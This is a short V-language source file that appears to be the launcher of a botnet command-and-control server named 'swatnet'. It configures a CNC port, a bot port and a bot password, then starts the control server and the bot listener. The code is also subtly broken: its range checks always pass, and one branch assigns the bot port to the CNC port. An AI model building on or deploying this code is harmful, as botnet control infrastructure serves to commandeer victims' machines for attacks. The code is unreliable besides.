import os

import core.cnc

fn main() {
	mut args := os.args.clone()
	mut s := cnc.start_swatnet()
	if args.len > 1 {
		for i, arg in args {
			match arg {
				"-p" {
					if arg.int() > 0 || arg.int() < 65500 { 
						s.port = args[i+1].int()
					}
				}
				"-bp" {
					if arg.int() > 0 || arg.int() < 65500 { 
						s.bot_port = args[i+1].int()
					}
				}
				"-pw" {
					s.bot_pw = args[i+1]
				} else {}
			}
		}
	} else {
		cnc_port := os.input("CNC Port (1-65500): ")
		bot_port := os.input("Bot Port (1-65500): ")
		bot_pw := os.input("Bot Password: ")
		if bot_port.int() > 0 && bot_port.int() < 65500 { 
			s.bot_port = bot_port.int()
		}

		if cnc_port.int() > 0 && cnc_port.int() < 65500 { 
			s.port = bot_port.int()
		}

		if bot_pw != "" {
			s.bot_pw = bot_pw
		}
	}
	if s.bot_port.int() == 0 || s.bot_port < 65500 {
		println("[ x ] Error, No bot port provided. Bot system did not start....")
	}

	if s.port.int() == 0 || s.port.int() > 65500 {
		println("[x] Error, Invalid port provided. CNC starting on the default port: ${s.port}....")
	}
	mut server := go cnc.start(mut &s)
	go cnc.start_bot(mut &s.bot, s.bot_port.str(), s.bot_pw)
	server.wait()	
}